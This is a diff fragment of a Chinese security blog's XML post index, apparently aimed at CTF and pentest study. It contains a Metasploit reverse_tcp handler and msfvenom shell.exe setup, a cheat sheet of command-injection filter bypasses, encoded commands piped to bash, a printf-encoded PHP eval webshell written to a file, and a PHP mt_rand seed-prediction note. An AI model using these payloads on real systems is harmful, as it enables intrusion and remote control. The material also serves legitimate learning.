+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>刷题站</category>
-        <category>ctfshow</category>
+        <category>渗透测试</category>
+        <category>msf shell制作</category>
       </categories>
   </entry>
   <entry>
@@ -844,20 +861,87 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>msf的shell在windows中的利用</title>
-    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>msf的shell的制作</p>
+    <title>ping命令执行及bypass</title>
+    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
+    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
 <a id="more"></a>
-<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
-<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
-<p>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
+<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
+<blockquote>
+<p><code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
+<blockquote>
+<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
+<p>使用下面两个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
+<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
+<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
+$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
+加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
+不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
+<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
+<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
+<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
+<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
+<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
+<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
+<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
+<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
+<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
+<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
+<blockquote>
+<p>more:一页一页的显示档案内容<br>
+less:与 more 类似<br>
+head:查看头几行<br>
+tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
+tail:查看尾几行<br>
+nl：显示的时候，顺便输出行号<br>
+od:以二进制的方式读取档案内容<br>
+vi:一种编辑器，这个也可以查看<br>
+vim:一种编辑器，这个也可以查看<br>
+sort:可以查看<br>
+uniq:可以查看<br>
+file -f:报错出具体内容</p>
+</blockquote>
+<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
+<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
+<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
+<hr>
+<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
+<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
+<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
+]]></content>
       <categories>
-        <category>渗透测试</category>
-        <category>msf shell制作</category>
+        <category>web技术学习</category>
+        <category>命令执行</category>
       </categories>
   </entry>
   <entry>
@@ -925,6 +1009,47 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>eval与assert</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php伪随机数漏洞</title>
+    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
+    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
+<a id="more"></a>
+<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
+<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
+<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
+<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
+<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
+<p>这张图能帮助我们更好的了解php伪随机数</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
+<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
+<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
+<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
+<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
+那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
+<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
+<p>kali下，进入目录，make</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
+<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
+<p>可以得到种子</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
+<p>验证种子是否一样就是看 输出的序列是否一样</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
+<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
+<p>平台：ctfshow    web入门  web25</p>
+<p>下面放出 此题的wp ：</p>
+<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
+<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>php伪随机数漏洞</category>
       </categories>
   </entry>
   <entry>
@@ -1030,131 +1155,6 @@ payload: cat flag.php||</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件 </span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line"></span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>other:    <strong>array_flip可以替换为array_reverse</strong></p>
 <pre><code>			**readfile可以替换为show_source  和 highlight_flie**</code></pre>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>php伪随机数漏洞</title>
-    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
-    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
-<a id="more"></a>
-<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
-<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
-<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
-<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
-<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
-<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
-<p>这张图能帮助我们更好的了解php伪随机数</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
-<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
-<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
-<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
-<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
-那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
-<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
-<p>kali下，进入目录，make</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
-<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
-<p>可以得到种子</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
-<p>验证种子是否一样就是看 输出的序列是否一样</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
-<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
-<p>平台：ctfshow    web入门  web25</p>
-<p>下面放出 此题的wp ：</p>
-<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
-<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>php伪随机数漏洞</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ping命令执行及bypass</title>
-    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
-    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
-<a id="more"></a>
-<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
-<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
-<blockquote>
-<p><code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
-<blockquote>
-<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
-<p>使用下面两个</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
-<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
-<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
-$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
-加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
-不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
-<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
-<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
-<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
-<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
-<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
-<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
-<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
-<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
-<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
-<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
-<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
-<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
-<blockquote>
-<p>more:一页一页的显示档案内容<br>
-less:与 more 类似<br>
-head:查看头几行<br>
-tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
-tail:查看尾几行<br>
-nl：显示的时候，顺便输出行号<br>
-od:以二进制的方式读取档案内容<br>
-vi:一种编辑器，这个也可以查看<br>
-vim:一种编辑器，这个也可以查看<br>
-sort:可以查看<br>
-uniq:可以查看<br>
-file -f:报错出具体内容</p>
-</blockquote>
-<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
-<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat 